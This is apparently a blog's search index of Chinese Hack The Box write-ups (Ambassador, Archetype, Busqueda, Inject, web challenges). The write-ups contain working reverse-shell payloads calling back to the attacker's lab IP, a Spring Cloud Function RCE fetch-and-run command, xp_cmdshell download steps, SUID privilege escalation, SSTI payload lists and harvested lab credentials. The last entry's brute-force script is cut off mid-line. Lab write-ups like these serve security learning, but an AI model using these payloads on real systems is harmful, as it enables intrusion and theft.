[{"title":"Ambassador靶机","url":"/2023/01/31/Ambassador%E9%9D%B6%E6%9C%BA/","content":"Ambassador靶机\n信息收集打开靶机环境，拿到靶机ip\nnmap扫描端口\n\n\n扫出22 80 3000 3306端口\n访问80以及3000端口\n\n文章提示，有一个developer账户可以去访问ssh\n\n访问3000端口发现是Grafana系统\n3000端口漏洞发现Google一下，发现有任意文件读取漏洞\n\n任意文件读取漏洞利用同时，searchsploit也能搜到这个漏洞，可以直接利用exp\n\n\n\n可以看到读取 &#x2F;etc&#x2F;passwd 成功，也就意味着可以读取到任意文件，那么我们可以读一下这个Grafana系统的配置文件来获取信息\ngoogle一下，得到配置文件路径 &#x2F;etc&#x2F;grafana&#x2F;grafana.ini\n\n读取配置文件，翻看找到数据库配置以及网站用户名密码\n\n\n登入网站后台，没发现什么有用的信息\n\ngrafana.db数据库查找这时候可以将数据库脱出来，查找3306端口的用户名密码\n先将grafana.db下载下来，这样就可以用命令来操作\n\n这里用到–path-as-is 不会压缩url，如果不用就会把..&#x2F;..&#x2F;..&#x2F;给忽略就会访问不到数据库文件\n\n3306端口连接在data_source下找到mysql用户名和密码，账号：grafana 密码：dontStandSoCloseToMe63221!，拿去登录3306端口\n\n连接成功，一通操作，在whackywidget数据库里找到了developer用户的密码，根据80端口的网站提示，这个用户可以登录ssh，base64解密后登录ssh。\n\n解码得到明文密码\n22端口连接\n成功连接\n\n拿到了user权限，同时得到了user的flag\n提权这时候我们需要提权到root用户权限获取flag\n1.内核提权\n\n可以看到，没有可用的exp\n2.sudo提权https://blog.csdn.net/god_zzZ/article/details/113628793\n\n可以看到不存在该漏洞，无法提权\n3.SUID提权https://blog.csdn.net/Fly_hps/article/details/80428173\n\n没有能够用来提权的目标\n4.计划任务提权https://blog.csdn.net/q20010619/article/details/121422797\n\n没有可利用的点\n5.&#x2F;git consul API提权\n可以看到，开了一个consul服务\nhttps://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec\n这个服务的目标端口为80、443、3000、8000、8008、8080、8443， 8500、8880、8888\n查看开了哪些端口\n\n确定服务器是用8500端口开的这个consul服务\n访问失败\n\n直接跑msf里的exp也失败\n端口转发已知之前nmap扫端口也没扫到8500，容易得打，8500端口只对内网开放，这时候就需要将端口转发到本地\n\n反弹shell利用msf中的exp\n\n查看需要配置的参数进行配置\n\n反弹成功\n\n得到flag\n","tags":["打靶","渗透测试","HTB"]},{"title":"Archetype靶机","url":"/2023/02/03/Archetype%E9%9D%B6%E6%9C%BA/","content":"  整个流程很明了，扫出开放端口，smb远程连接，拿到数据库密码，利用mssqlclient建立连接，利用xp_cmdshell传nc，反弹shell拿到普通用户权限，利用WinPEAS提权，拿到最高权限密码，再通过psexec拿最高权限shell。整体思路很明确，需要注意的是与数据库连接后xp_cmdshell的开启，通过xp_cmdshell执行powershell命令的写法，通过xp_cmdshell传nc和winpeas时的目录是否有写入权限，反弹nc时端口的开启。这里问答题不一一写出了，答案过程中都有。\n\n\n常规nmap扫描\n\n可以看到139和445端口开了smb服务，1433端口开了数据库。\n用smbclient连接\nsmbclient -L 10.129.251.225 列出共享文件\n\n\n\n\n连接backups文件夹\n\n将prod.dtsConfig文件get到本地查看，得到passwd:M3g4c0rp123，user id:ARCHETYPE\\SqL_svc\n接下来利用impacket包下的mssqlclient.py与数据库建立连接\n\n执行SELECT IS_SRVROLEMEMBER(‘sysadmin’) 查看权限，回显1，表示当前用户有sysadmin权限\n接着enable_xp_cmdshell; 获取xp_cmdshell\nxp_cmdshell 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 sql servevr 的原生工具\n也就是说把xp_cmdshell开启后，可以在sql中执行系统命令。\n本地监听80端口\n\n访问可以看到我们本机的文件\n\n也就是说，我们可以将payload放在本机中，然后通过xp_cmdshell来访问我们本机文件来下载到目标服务器\n然后本地nc监听，目标服务器使用nc连接获取shell\n\n通过wget下载，发现没有权限\n换个有执行写入权限的目录\n\nxp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads;wget http://10.10.16.10/nc64.exe -outfile nc64.exe&quot;\n切换到downloads目录，通过wget获取到本机nc64.exe下载到目录下\nxp_cmdshell &quot;powershell -c cd C:\\Users\\sql_svc\\Downloads;dir&quot;\ndir查看文件是否下载成功\n开启nc监听4443端口\n\n主机执行以下命令，开启nc\n\n反弹成功\n\n\n拿到user下的flag\n接下来，提权到root用户\n使用到WinPEAS工具，这个 WinPEAS 是一个脚本，用于搜索在 Windows 主机上提升权限的可能方法，进行扫描\n\n在主机上执行\n\n在第一个文件中查看到了administrator的密码MEGACORP_4dm1n!!，这个ConsoleHost_history.txt是powershell的历史文件，相当于 Linux 系统的.bash_history\n\n接下来使用impacket包下的psexec.py进行连接登录\nPsExec 是一个轻型的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。PsExec 最强大的功能之一是在远程系统和远程支持工具（如 IpConfig）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。\n\n最后连接这里，一直连接出错，就重启了台机器。\n\n得到root权限下的flag\n\n","tags":["打靶","渗透测试","HTB"]},{"title":"Busqueda靶机","url":"/2023/04/15/Busqueda/","content":"nmap扫描┌──(n3ym4r㉿kali)-[~]                                                       \n└─$ nmap 10.10.11.208                                                        \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 15:41 CST              \nStats: 0:01:57 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan  \nConnect Scan Timing: About 99.99% done; ETC: 15:43 (0:00:00 remaining)       \nNmap scan report for 10.10.11.208                                            \nHost is up (0.90s latency).                                                  \nNot shown: 998 closed tcp ports (conn-refused)                               \nPORT   STATE SERVICE                                                         \n22/tcp open  ssh                                                             \n80/tcp open  http                                                            \n                                                                             \nNmap done: 1 IP address (1 host up) scanned in 118.88 seconds \n\n┌──(n3ym4r㉿kali)-[~]\n└─$ sudo nmap 10.10.11.208 -sC -sV -O -p22,80\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 15:53 CST\nNmap scan report for 10.10.11.208\nHost is up (0.82s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)\n|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52\n|_http-title: Did not follow redirect to http://searcher.htb/\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 5.4 (93%), Android 4.1.1 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 55.40 seconds\n\n22、80端口开放，在&#x2F;etc&#x2F;hosts中添加searcher.htb，访问web端\nWeb端漏洞发现\n查看页脚可以看到由searchor驱动\nhttps://github.com/ArjunSharda/Searchor\n作用为使用指定的搜索引擎搜索信息，那么可以让它重定向到我们的ip\nbp抓包\nPOST /search HTTP/1.1\nHost: searcher.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\nOrigin: http://searcher.htb\nConnection: close\nReferer: http://searcher.htb/\nUpgrade-Insecure-Requests: 1\n\nengine=Youtube&amp;query=1111\n\n可以看到有两个参数，那么可以尝试在参数位置写入我们的payload\n漏洞利用本地建立监听\n┌──(n3ym4r㉿kali)-[~]\n└─$ nc -nvlp 4444               \nlistening on [any] 4444 ...\n\n修改bp数据包\nPOST /search HTTP/1.1\nHost: searcher.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 311\nOrigin: http://searcher.htb\nConnection: close\nReferer: http://searcher.htb/\nUpgrade-Insecure-Requests: 1\n\nengine=BBC&amp;query=ddd&#39;%2beval(compile(&#39;for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20import%20socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.7&quot;,4444));subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;%2c&#39;a&#39;%2c&#39;single&#39;))%2b&#39;\n\n反弹成功\n┌──(n3ym4r㉿kali)-[~]\n└─$ sudo nc -nvlp 4444 \n[sudo] n3ym4r 的密码：\nlistening on [any] 4444 ...\n\n\n\nconnect to [10.10.16.7] from (UNKNOWN) [10.10.11.208] 57632\n/bin/sh: 0: can&#39;t access tty; job control turned off\n$ $ $ $ \n\n$ $ $ $ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;\nsvc@busqueda:/var/www/app$ whoami\nwhoami\nsvc\nsvc@busqueda:/var/www/app$ cd\ncd\nsvc@busqueda:~$ ls\nls\nsnap  user.txt\nsvc@busqueda:~$ cat user.txt\ncat user.txt\n096886c4a46a05675658f26bbaef429f\nsvc@busqueda:~$ \n\npython3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;提升shell交互性,找到user flag\n提权到处查找信息\nsvc@busqueda:/var/www/app$ ls -al\nls -al\ntotal 20\ndrwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .\ndrwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..\n-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py\ndrwxr-xr-x 8 www-data www-data 4096 Apr 15 03:25 .git\ndrwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates\nsvc@busqueda:/var/www/app$ cd .git\ncd .git\nsvc@busqueda:/var/www/app/.git$ ls\nls\nbranches        config       HEAD   index  logs     refs\nCOMMIT_EDITMSG  description  hooks  info   objects\nsvc@busqueda:/var/www/app/.git$ cat config\ncat config\n[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n    logallrefupdates = true\n[remote &quot;origin&quot;]\n    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git\n    fetch = +refs/heads/*:refs/remotes/origin/*\n[branch &quot;main&quot;]\n    remote = origin\n    merge = refs/heads/main\nsvc@busqueda:/var/www/app/.git$\n\n在www&#x2F;app&#x2F;.git&#x2F;config下看到疑似密码的字符串，尝试一下\nsudo -lsvc@busqueda:/var/www/app/.git$ sudo -l\nsudo -l\n[sudo] password for svc: jh1usoih2bkjaspwe92\n\nMatching Defaults entries for svc on busqueda:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser svc may run the following commands on busqueda:\n    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *\nsvc@busqueda:/var/www/app/.git$ \n\n可以看到当前用户是可以运行一个名为system-checkup.py *的脚本\n我们无法读取脚本信息，尝试运行能看到一些信息\nsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *\nUsage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)\n\n     docker-ps     : List running docker containers\n     docker-inspect : Inpect a certain docker container\n     full-checkup  : Run a full system checkup\n\n在&#x2F;tmp文件夹下新建一个full-checkup.sh\ncd /tmp\nsvc@busqueda:/tmp$ cat full-checkup.sh\n#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.16.7/1234 0&gt;&amp;1\nsvc@busqueda:/tmp$ chmod +x full-checkup.sh\nsvc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n\n新建一个监听\n┌──(n3ym4r㉿kali)-[~]\n└─$ nc -nvlp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.16.7] from (UNKNOWN) [10.10.11.208] 45004\nroot@busqueda:/tmp# whoami\nwhoami\nroot\nroot@busqueda:/tmp# ls\nls\npee\npoo\nsnap-private-tmp\nsystemd-private-6591c6e8ee094027a315ba6425f4dca2-apache2.service-SfEkK1\nsystemd-private-6591c6e8ee094027a315ba6425f4dca2-ModemManager.service-zSf6WS\nsystemd-private-6591c6e8ee094027a315ba6425f4dca2-systemd-logind.service-G8ik4Z\nsystemd-private-6591c6e8ee094027a315ba6425f4dca2-systemd-resolved.service-HSkC2C\nsystemd-private-6591c6e8ee094027a315ba6425f4dca2-systemd-timesyncd.service-xA7W3d\nsystemd-private-6591c6e8ee094027a315ba6425f4dca2-upower.service-fuvS6w\ntmux-1000\nvmware-root_841-4013329999\nroot@busqueda:/tmp# cd\ncd\nroot@busqueda:~# ls\nls\necosystem.config.js\nroot.txt\nscripts\nsnap\nroot@busqueda:~# cat root.txt\ncat root.txt\n6df616616ffeb8d7982621ba4603295d\nroot@busqueda:~# \n\n得到root shell，找到root flag\n","tags":["打靶","渗透测试","HTB"]},{"title":"injecte靶机","url":"/2023/03/23/HTB-inject/","content":"  这个靶机是HTB近期新出的靶机，整体流程为利用web端lfi漏洞读取文件，发现web服务版本及现有的rce漏洞，利用rce拿到shell，查看信息，发现另一个用户phil的明文密码，登录phil用户，拿到user flag，再通过pspy64找到一个可控的计划任务，进行提权，拿到root flag。\n\n\n\nnmap扫描┌──(n3ym4r㉿kali)-[~]\n└─$ nmap 10.10.11.204                             \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:20 CST\nNmap scan report for 10.10.11.204\nHost is up (0.86s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 96.38 seconds\n\n┌──(n3ym4r㉿kali)-[~]\n└─$ nmap -p22,8080 -sC -sV 10.10.11.204\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:23 CST\nNmap scan report for 10.10.11.204\nHost is up (0.40s latency).\n\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)\n|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)\n|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)\n8080/tcp open  nagios-nsca Nagios NSCA\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Home\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 38.08 seconds\n\n开放了22、8080端口，访问8080web服务\nweb服务\n右上角有一个上传文件按钮，是一个图片上传点\n随便上传一张图片，抓包看看\n\n上传成功后，点击查看图片，url中\nGET /show_image?img=Fpq6zvOWYAIT2EU.jpeg HTTP/1.1\nHost: 10.10.11.204:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: http://10.10.11.204:8080/upload\nUpgrade-Insecure-Requests: 1\n\nbp抓包，可以看到url中会有个img参数去访问我们刚刚上传的图片\nLFI漏洞那么，这里就会想到lfi，看是否能包含到本地其他文件\n\n经过多次尝试往回找寻六次目录即可到达根目录下，查看到etc&#x2F;passwd文件\n尝试读取网站源码\n一层一层查找，在WebApp下查看到pom.xml文件\n\n注意右边回显\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;\n            &lt;version&gt;3.2.2&lt;/version&gt;\n        &lt;/dependency&gt;\n\n可以看到使用了一个3.2.2版本的Spring Cloud Function\nCVE 2022-22965漏洞利用谷歌一下此版本存在CVE 2022-22965漏洞\nhttps://sysdig.com/blog/cve-2022-22963-spring-cloud/\nhttps://github.com/darryk10/CVE-2022-22963\n关于利用，链接写的很明了，我们可以使用curl发包，也可以使用bp\n准备一个简单的反弹shell\n┌──(n3ym4r㉿kali)-[~]\n└─$ cat rev.sh    \n#!/bin/bash\n/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.12/4444 0&gt;&amp;1&#39;\n\n开一个监听\n┌──(n3ym4r㉿kali)-[~]\n└─$ nc -nvlp 4444            \nlistening on [any] 4444 ...\n\n开一个web服务，以提供靶机下载\n┌──(n3ym4r㉿kali)-[~]\n└─$ python -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.204 - - [23/Mar/2023 13:53:07] &quot;GET /rev.sh HTTP/1.1&quot; 200 -\n\n靶机下载sh\n┌──(n3ym4r㉿kali)-[~]\n└─$ curl -i -s -k -X &#39;POST&#39;  --data-raw &#39;data&#39; -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;wget 10.10.16.12/rev.sh -O /tmp/rev.sh&quot;)&#39; &#39;http://10.10.11.204:8080/functionRouter&#39;\nHTTP/1.1 500 \nTransfer-Encoding: chunked\nConnection: keep-alive\nContent-Type: application/json\nDate: Thu, 23 Mar 2023 06:20:24 GMT\nKeep-Alive: timeout=4\nProxy-Connection: keep-alive\n\n&#123;&quot;timestamp&quot;:&quot;2023-03-23T06:20:24.597+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;&#125;                                                                                           \n\n执行rev.sh\n┌──(n3ym4r㉿kali)-[~]\n└─$ curl -i -s -k -X &#39;POST&#39;  --data-raw &#39;data&#39; -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;/bin/bash /tmp/rev.sh&quot;)&#39; &#39;http://10.10.11.204:8080/functionRouter&#39;\nHTTP/1.1 500 \nTransfer-Encoding: chunked\nConnection: keep-alive\nContent-Type: application/json\nDate: Thu, 23 Mar 2023 06:21:41 GMT\nKeep-Alive: timeout=4\nProxy-Connection: keep-alive\n\n&#123;&quot;timestamp&quot;:&quot;2023-03-23T06:21:41.414+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;&#125;   \n\n得到反弹shell\n┌──(n3ym4r㉿kali)-[~]\n└─$ nc -nvlp 4444            \nlistening on [any] 4444 ...\nconnect to [10.10.16.12] from (UNKNOWN) [10.10.11.204] 59054\nbash: cannot set terminal process group (801): Inappropriate ioctl for device\nbash: no job control in this shell\nfrank@inject:/$ whoami\nwhoami\nfrank\nfrank@inject:/$ id\nid\nuid=1000(frank) gid=1000(frank) groups=1000(frank)\n\n提权frank@inject:/$ ls\nls\nbin\nboot\ndev\netc\nhome\nlib\nlib32\nlib64\nlibx32\nlost+found\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\nfrank@inject:/$ cd home\t\ncd home\nfrank@inject:/home$ ls -la\nls -la\ntotal 16\ndrwxr-xr-x  4 root  root  4096 Feb  1 18:38 .\ndrwxr-xr-x 18 root  root  4096 Feb  1 18:38 ..\ndrwxr-xr-x  5 frank frank 4096 Feb  1 18:38 frank\ndrwxr-xr-x  3 phil  phil  4096 Mar 23 06:12 phil\nfrank@inject:/home$ cd frank\ncd frank\nfrank@inject:~$ ls -la\nls -la\ntotal 28\ndrwxr-xr-x 5 frank frank 4096 Feb  1 18:38 .\ndrwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..\nlrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc\ndrwx------ 2 frank frank 4096 Feb  1 18:38 .cache\ndrwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local\ndrwx------ 2 frank frank 4096 Feb  1 18:38 .m2\n-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile\nfrank@inject:~$ cd .m2\ncd .m2\nfrank@inject:~/.m2$ ls\nsettings.xml\nfrank@inject:~/.m2$ cat settings.xml\ncat settings.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\n  &lt;servers&gt;\n    &lt;server&gt;\n      &lt;id&gt;Inject&lt;/id&gt;\n      &lt;username&gt;phil&lt;/username&gt;\n      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;\n      &lt;privateKey&gt;$&#123;user.home&#125;/.ssh/id_dsa&lt;/privateKey&gt;\n      &lt;filePermissions&gt;660&lt;/filePermissions&gt;\n      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;\n      &lt;configuration&gt;&lt;/configuration&gt;\n    &lt;/server&gt;\n  &lt;/servers&gt;\n&lt;/settings&gt;\nfrank@inject:~/.m2$ \n\n在home&#x2F;frank目录下的.m2&#x2F;setting.xml文件看到phil用户的明文密码为DocPhillovestoInject123\n切换到phil用户\nbash-5.0$ su - phil\nsu - phil\nPassword: DocPhillovestoInject123\nwhoami\nphil\npwd\n/home/phil\nid\nuid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)\nls\npspy64\nuser.txt\ncat user.txt\n814beeeaca90583b280d5130c699eb4c\n\n拿到user flag\n上传一个pspy64，查看正在运行的服务，可以看到有一个在目录 &#x2F;opt&#x2F;automation&#x2F;tasks 上执行 ansible-parallel的任务,此任务会执行&#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;目录下的所有.yml文件，我们可以写入一个恶意.yml文件，使其执行\n2023/03/23 07:08:01 CMD: UID=0     PID=6173   | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml \n2023/03/23 07:08:01 CMD: UID=0     PID=6172   | sleep 10 \n2023/03/23 07:08:01 CMD: UID=0     PID=6171   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml \n\nhttps://gtfobins.github.io/gtfobins/ansible-playbook/#shell\n在此链接看到利用方式\nTF=$(mktemp)\necho &#39;[&#123;hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]&#125;]&#39; &gt;$TF\nansible-playbook $TF\n\necho &#39;[&#123;hosts: localhost, tasks: [shell: /usr/bin/chmod +s /bin/bash]&#125;]&#39; &gt;&gt; /opt/automation/tasks/escalate.yml\nwhoami\nphil\nbash -p\n\nls -la /bin/bash\n-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash\n/bin/bash -p\nid\nuid=1001(phil) gid=1001(phil) euid=0(root) egid=0(root) groups=0(root),50(staff),1001(phil)\nwhoami\nroot\ncd root\nls  \n/bin/bash: line 3: cd: root: No such file or directory\npspy64\nuser.txt\ncd /root\nls\nplaybook_1.yml\nroot.txt\ncat root.txt\nb1e8275be264df7aab57f5551b986580\n\n拿到root flag\n","tags":["打靶","渗透测试","HTB"]},{"title":"HTB Challenges—Web","url":"/2023/02/04/HTB%20Challenges%E2%80%94Web/","content":"Templated打开页面，有提示说是Flask&#x2F;jinja2框架搭建，以及靶机标题templated判断为ssti模板注入\n\n输入9测试\n\n回显9，确定为ssti模板注入\n\nhttp://178.128.171.82:31589/&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;\n&#123;% if c.__name__=='_IterationGuard' %&#125;\n&#123;&#123; c.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('ls ').read()\") &#125;&#125;\n&#123;% endif %&#125;\n&#123;% endfor %&#125;\n\n\n回显了目录列表，查看flag.txt\n\n拿到flag\n这里是典型的python-Flask模板注入，一些基础payload：\n获得基类\n#python2.7\n&#39;&#39;.__class__.__mro__[2]\n&#123;&#125;.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[1]\n#python3.7\n&#39;&#39;.__。。。class__.__mro__[1]\n&#123;&#125;.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[1]\n\n#python 2.7\n#文件操作\n#找到file类\n[].__class__.__bases__[0].__subclasses__()[40]\n#读文件\n[].__class__.__bases__[0].__subclasses__()[40](&#39;/etc/passwd&#39;).read()\n#写文件\n[].__class__.__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)\n\n#命令执行\n#os执行\n[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：\n[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()\n#eval,impoer等全局函数\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()\n[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()\n\n#python3.7\n#命令执行\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n#文件操作\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n#windows下的os命令\n&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).r\n\nPhonebook打开页面是一个登录框\n\n看到登录框，第一反应为sql注入，试一下万能密码admin&#39; or &#39;1&#39;=&#39;1不行，然后fuzz一下，看有没有SQL注入，没有成功。\n尝试通配符登录，用户名密码都填*，登录成功\n\n是一个查询用户电话号码的搜索页面，到处瞅瞅页面没啥问题\n问题回到那个登录框，将用户名改为页面下留言的Reese，密码为*，登录成功\n将用户名改成其他，密码为*，无法登录\n也就是说登录用户名确定为Reese，猜测密码即为flag，flag格式为HTB{}，将密码改为H*，发现登录成功，说明猜测没错接下来就是写个脚本爆破出flag值。脚本原理即为一位一位遍历，后面加上一个通配符，前面一位是对的时，会登录成功，否则登录失败。\ngo脚本如下：\npackage main\n\nimport (\n    &quot;bytes&quot;\n    &quot;fmt&quot;\n    &quot;io/ioutil&quot;\n    &quot;net/http&quot;\n    &quot;strings&quot;\n)\n\nfunc main() &#123;\n    url := &quot;http://144.126.228.187:30674/login&quot;\n    client := &amp;http.Client&#123;&#125;\n    chars := &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.?!_&#125;&quot;\n    flag := &quot;HTB&#123;&quot;\n    password := &quot;&quot;\n    for i := 0; i &lt; len(chars); i++ &#123;\n        password = flag + string(chars[i]) + &quot;*&quot;\n        fmt.Printf(&quot;[-] testing %s&quot;, password)\n        data := []byte(&quot;username=Reese&amp;password=&quot; + password)\n        req, _ := http.NewRequest(&quot;POST&quot;, url, bytes.NewBuffer(data))\n        req.Header.Add(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;)\n        